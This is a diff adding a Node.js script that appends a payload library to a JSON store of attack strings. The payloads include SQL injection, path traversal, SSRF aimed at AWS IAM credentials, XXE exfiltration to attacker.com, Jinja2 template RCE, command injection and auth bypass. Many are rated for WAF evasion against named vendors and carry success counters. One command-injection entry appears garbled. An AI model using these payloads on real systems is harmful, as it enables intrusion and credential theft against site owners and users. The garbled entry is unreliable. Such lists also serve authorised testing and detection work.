@@ -1,0 +1,37 @@
+﻿const fs=require('fs');const p=require('path').join(__dirname,'data','master_payloads.json');
+const e=JSON.parse(fs.readFileSync(p));
+const m=[
+{id:'sqli-001',category:'SQLi',payload:"' OR '1'='1",bypass_level:0,target_os:'any',waf_signatures:[],tags:['basic','auth-bypass'],context:'WHERE',success_count:0},
+{id:'sqli-002',category:'SQLi',payload:"' OR 1=1--",bypass_level:0,target_os:'any',waf_signatures:[],tags:['auth-bypass','comment'],context:'WHERE',success_count:0},
+{id:'sqli-003',category:'SQLi',payload:"UNION SELECT NULL,NULL,NULL--",bypass_level:1,target_os:'any',waf_signatures:[],tags:['union','column-enum'],context:'UNION',success_count:0},
+{id:'sqli-004',category:'SQLi',payload:"' UNION SELECT username,password FROM users--",bypass_level:1,target_os:'any',waf_signatures:[],tags:['union','data-exfil'],context:'UNION',success_count:0},
+{id:'sqli-005',category:'SQLi',payload:"admin'--",bypass_level:0,target_os:'any',waf_signatures:[],tags:['auth-bypass','admin'],context:'WHERE',success_count:0},
+{id:'sqli-006',category:'SQLi',payload:"1' AND SLEEP(5)--",bypass_level:2,target_os:'any',waf_signatures:[],tags:['time-based','blind'],context:'WHERE',success_count:0},
+{id:'sqli-007',category:'SQLi',payload:"1'/*!UNION*//*!SELECT*/1,2,3--",bypass_level:4,target_os:'any',waf_signatures:['Cloudflare','ModSecurity'],tags:['WAF bypass','evasion'],context:'UNION',success_count:0},
+{id:'sqli-008',category:'SQLi',payload:"1'/**/UNION/**/SELECT/**/1,2,3--",bypass_level:3,target_os:'any',waf_signatures:['ModSecurity'],tags:['comment-whitespace','WAF bypass'],context:'UNION',success_count:0},
+{id:'lfi-001',category:'LFI',payload:"../../../../etc/passwd",bypass_level:0,target_os:'Linux',waf_signatures:[],tags:['basic','path-traversal'],context:'path',success_count:0},
+{id:'lfi-002',category:'LFI',payload:"....//....//....//....//etc/passwd",bypass_level:2,target_os:'Linux',waf_signatures:['ModSecurity'],tags:['double-dot','WAF bypass'],context:'path',success_count:0},
+{id:'lfi-003',category:'LFI',payload:"php://filter/convert.base64-encode/resource=index.php",bypass_level:1,target_os:'any',waf_signatures:[],tags:['php-wrapper','source-code'],context:'php',success_count:0},
+{id:'lfi-004',category:'LFI',payload:"..%252f..%252f..%252fetc%252fpasswd",bypass_level:4,target_os:'Linux',waf_signatures:['Cloudflare','Akamai'],tags:['double-url','WAF bypass'],context:'path',success_count:0},
+{id:'lfi-005',category:'LFI',payload:"/proc/self/environ",bypass_level:2,target_os:'Linux',waf_signatures:[],tags:['proc','environ','rce'],context:'path',success_count:0},
+{id:'ssrf-001',category:'SSRF',payload:"http://127.0.0.1:80",bypass_level:0,target_os:'any',waf_signatures:[],tags:['basic','localhost'],context:'url',success_count:0},
+{id:'ssrf-002',category:'SSRF',payload:"http://169.254.169.254/latest/meta-data/",bypass_level:1,target_os:'any',waf_signatures:[],tags:['cloud','aws','metadata'],context:'url',success_count:0},
+{id:'ssrf-003',category:'SSRF',payload:"http://169.254.169.254/latest/meta-data/iam/security-credentials/",bypass_level:1,target_os:'any',waf_signatures:[],tags:['aws','iam','credential-theft'],context:'url',success_count:0},
+{id:'ssrf-004',category:'SSRF',payload:"http://0x7f000001/",bypass_level:3,target_os:'any',waf_signatures:['Cloudflare'],tags:['hex-ip','WAF bypass'],context:'url',success_count:0},
+{id:'ssrf-005',category:'SSRF',payload:"http://2130706433/",bypass_level:3,target_os:'any',waf_signatures:['Cloudflare','Akamai'],tags:['decimal-ip','WAF bypass'],context:'url',success_count:0},
+{id:'ssrf-006',category:'SSRF',payload:"file:///etc/passwd",bypass_level:2,target_os:'Linux',waf_signatures:[],tags:['file-protocol','local-file-read'],context:'url',success_count:0},
+{id:'xxe-001',category:'XXE',payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',bypass_level:0,target_os:'Linux',waf_signatures:[],tags:['basic','file-read'],context:'xml',success_count:0},
+{id:'xxe-002',category:'XXE',payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/exfil">]><foo>&xxe;</foo>',bypass_level:1,target_os:'any',waf_signatures:[],tags:['oob','exfiltration'],context:'xml',success_count:0},
+{id:'ssti-001',category:'SSTI',payload:"{{7*7}}",bypass_level:0,target_os:'any',waf_signatures:[],tags:['basic','detection','jinja2'],context:'template',success_count:0},
+{id:'ssti-002',category:'SSTI',payload:'{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',bypass_level:2,target_os:'Linux',waf_signatures:[],tags:['jinja2','rce','flask'],context:'template',success_count:0},
+{id:'cmdi-001',category:'Command Injection',payload:"; id",bypass_level:0,target_os:'Linux',waf_signatures:[],tags:['basic','semicolon'],context:'shell',success_count:0},
+{id:'cmdi-002',category:'Command Injection',payload:"| whoami",bypass_level:0,target_os:'any',waf_signatures:[],tags:['pipe','whoami'],context:'shell',success_count:0},
+{id:'cmdi-003',category:'Command Injection',payload:";catecho/etc/passwd",bypass_level:3,target_os:'Linux',waf_signatures:['Cloudflare','ModSecurity'],tags:['ifs-bypass','WAF bypass'],context:'shell',success_count:0},
+{id:'cmdi-004',category:'Command Injection',payload:"%0Aid",bypass_level:3,target_os:'Linux',waf_signatures:['ModSecurity'],tags:['newline','WAF bypass'],context:'shell',success_count:0},
+{id:'auth-001',category:'Auth Bypass',payload:"admin' OR '1'='1'--",bypass_level:0,target_os:'any',waf_signatures:[],tags:['sqli-auth','login'],context:'login',success_count:0},
+{id:'auth-002',category:'Auth Bypass',payload:"admin'/*",bypass_level:1,target_os:'any',waf_signatures:[],tags:['comment-bypass'],context:'login',success_count:0},
+{id:'auth-003',category:'Auth Bypass',payload:"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",bypass_level:2,target_os:'any',waf_signatures:[],tags:['jwt','alg-none'],context:'token',success_count:0},
+{id:'auth-004',category:'Auth Bypass',payload:"..;/admin/",bypass_level:3,target_os:'any',waf_signatures:['ModSecurity'],tags:['path-traversal','spring'],context:'url',success_count:0},
+{id:'auth-005',category:'Auth Bypass',payload:'{"role":"admin"}',bypass_level:2,target_os:'any',waf_signatures:[],tags:['mass-assignment','role-escalation'],context:'registration',success_count:0}
+];
+const a=[...e,...m];fs.writeFileSync(p,JSON.stringify(a,null,2));console.log('Total:',a.length);
